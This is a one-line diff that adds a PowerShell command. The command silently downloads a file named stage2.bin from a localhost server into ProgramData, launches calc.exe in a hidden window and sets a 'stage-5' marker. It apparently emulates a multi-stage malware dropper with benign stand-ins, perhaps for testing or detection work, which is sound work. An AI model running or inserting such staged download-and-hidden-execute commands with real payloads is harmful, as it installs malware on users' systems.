@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://localhost:8000/update.dat" -OutFile "C:\ProgramData\stage2.bin" -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath 'calc.exe' -WindowStyle Hidden -ErrorAction SilentlyContinue; $StageMarker = "stage-5"
